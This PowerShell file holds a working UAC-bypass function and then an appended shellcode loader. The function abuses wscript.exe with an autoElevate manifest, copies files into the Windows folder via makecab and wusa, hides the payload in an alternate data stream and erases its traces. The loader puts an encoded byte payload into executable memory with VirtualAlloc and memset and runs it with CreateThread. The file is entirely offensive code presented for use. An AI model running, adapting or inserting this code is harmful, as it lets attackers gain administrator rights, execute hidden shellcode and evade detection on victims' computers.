function Invoke-WScriptBypassUAC
{
    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]
        $payload
    )

    function Local:Get-TempFileName {
        
        $sTempFolder = $env:Temp
        $sTempFolder = $sTempFolder + "\"
        $sTempFileName = [System.IO.Path]::GetRandomFileName() + ".tmp"
        $sTempFileName = $sTempFileName -split '\.',([regex]::matches($sTempFileName,"\.").count) -join ''
        $sTempFileNameFinal = $sTempFolder + $sTempFileName 
        return $sTempFileNameFinal
    }

    function Local:Invoke-CopyFile($sSource, $sTarget) {
       
       $sTempFile = Get-TempFileName
       Start-Process -WindowStyle Hidden -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList "$sSource $sTempFile"
       $null = wusa "$sTempFile" /extract:"$sTarget" /quiet

       
       Start-Sleep -s 2
       
       
       Remove-Item $sTempFile
   }

    function Local:Invoke-WscriptTrigger {
        
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".vbs"
        $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

        $VBSPayload = "Dim objShell:"
        $VBSPayload += "Dim oFso:"
        $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):"
        $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"
        $VBSPayload += "command = ""$payload"":"
        $VBSPayload += "objShell.Run command, 0:"
        
        
        $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""""
        $VBSPayload += "command = ""$DelCommand"":"
        $VBSPayload += "objShell.Run command, 0:"
        $VBSPayload += "Set objShell = Nothing"

		"[*] Storing VBS payload into `"$env:USERPROFILE\AppData:$ADSFile`""
        $CreateWrapperADS = {cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $CreateWrapperADS
        
		"[*] Executing VBS payload with modified scripting host"
        $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}
        Invoke-Command -ScriptBlock $ExecuteScript
		
		"[*] Removing Alternate Data Stream from $("$env:USERPROFILE\AppData:$ADSFile")"
        Remove-ADS $env:USERPROFILE\AppData:$ADSFile
    }

    function Local:Invoke-WscriptElevate {

        $WscriptManifest =
@"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0">
  <asmv3:trustInfo>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </asmv3:trustInfo>
  <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
      <autoElevate>true</autoElevate>
      <dpiAware>true</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
"@

        
        $sManifest = $env:Temp + "\wscript.exe.manifest"
        $WscriptManifest | Out-File $sManifest -Encoding UTF8
		
		"[*] Cabbing and extracting manifest into $($env:WINDIR)"
        Invoke-CopyFile $sManifest $env:WINDIR

		"[*] Cabbing and extracting wscript.exe into $($env:WINDIR)"
        $WScriptPath = "$($env:WINDIR)\System32\wscript.exe"
        Invoke-CopyFile $WScriptPath $env:WINDIR
        Remove-Item -Force $sManifest

        
        Invoke-WscriptTrigger
    }

    function Local:Remove-ADS {
        
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [string]$ADSPath
        )
     
        
        
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
     
        $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
            @('kernel32.dll'),
            [Reflection.FieldInfo[]]@($SetLastError),
            @($True))
     
        
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
            'kernel32.dll',
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@([String]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi)
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
        
        $Kernel32 = $TypeBuilder.CreateType()
        
        $Result = $Kernel32::DeleteFile($ADSPath)

        if ($Result){
            Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
        }
        else{
            Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
        }
    }

    
    $OSVersion = [Environment]::OSVersion.Version
    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){
        if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -eq $True){
            Write-Warning "[!] You are already elevated!"
        }
        else {
            Invoke-WscriptElevate
        }
    }else{Write-Warning "[!] Target Not Vulnerable"}
}

Set-Alias Invoke-WScriptUACBypass Invoke-WScriptBypassUAC

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xdd,0x68,0x19,0x6f,0xd9,0xcd,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x4b,0x31,0x57,0x15,0x03,0x57,0x15,0x83,0xc7,0x04,0xe2,0x28,0x94,0xf1,0xed,0xd2,0x65,0x02,0x92,0x5b,0x80,0x33,0x92,0x3f,0xc0,0x64,0x22,0x34,0x84,0x88,0xc9,0x18,0x3d,0x1a,0xbf,0xb4,0x32,0xab,0x0a,0xe2,0x7d,0x2c,0x26,0xd6,0x1c,0xae,0x35,0x0a,0xff,0x8f,0xf5,0x5f,0xfe,0xc8,0xe8,0xad,0x52,0x80,0x67,0x03,0x43,0xa5,0x32,0x9f,0xe8,0xf5,0xd3,0xa7,0x0d,0x4d,0xd5,0x86,0x83,0xc5,0x8c,0x08,0x25,0x09,0xa5,0x01,0x3d,0x4e,0x80,0xd8,0xb6,0xa4,0x7e,0xdb,0x1e,0xf5,0x7f,0x77,0x5f,0x39,0x72,0x86,0xa7,0xfe,0x6d,0xfd,0xd1,0xfc,0x10,0x05,0x26,0x7e,0xcf,0x80,0xbd,0xd8,0x84,0x32,0x1a,0xd8,0x49,0xa4,0xe9,0xd6,0x26,0xa3,0xb6,0xfa,0xb9,0x60,0xcd,0x07,0x31,0x87,0x02,0x8e,0x01,0xa3,0x86,0xca,0xd2,0xca,0x9f,0xb6,0xb5,0xf3,0xc0,0x18,0x69,0x51,0x8a,0xb5,0x7e,0xe8,0xd1,0xd1,0xb3,0xc0,0xe9,0x21,0xdc,0x53,0x99,0x13,0x43,0xcf,0x35,0x18,0x0c,0xc9,0xc2,0x5f,0x27,0xad,0x5d,0x9e,0xc8,0xcd,0x74,0x65,0x9c,0x9d,0xee,0x4c,0x9d,0x76,0xef,0x71,0x48,0xd8,0xbf,0xdd,0x23,0x98,0x6f,0x9e,0x93,0x70,0x7a,0x11,0xcb,0x60,0x85,0xfb,0x64,0x0a,0x7f,0x6c,0x4b,0x62,0x7e,0xa5,0x23,0x70,0x81,0x2a,0x2e,0xfd,0x67,0x3e,0x5e,0xab,0x30,0xd7,0xc7,0xf6,0xcb,0x46,0x07,0x2d,0xb6,0x49,0x83,0xc7,0x46,0x07,0x64,0xa2,0x54,0x70,0x4b,0x4c,0xa5,0x81,0xde,0x4c,0xcf,0x85,0x48,0x1b,0x67,0x84,0xad,0x6b,0x28,0x77,0x98,0xe8,0x2f,0x87,0x5d,0x07,0x44,0xbe,0xcb,0x97,0x33,0xbf,0x1b,0x17,0xc4,0xe9,0x71,0x17,0xac,0x4d,0x22,0x44,0xc9,0x91,0xff,0xf9,0x42,0x04,0x00,0xab,0x37,0x8f,0x68,0x51,0x61,0xe7,0x36,0xaa,0x44,0x7b,0x30,0x54,0x19,0xbf,0xc0,0x97,0xcc,0xf9,0xb6,0xfe,0xcc,0xbd,0xc9,0xb5,0x71,0x97,0x43,0xb5,0x26,0xe7,0x41;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

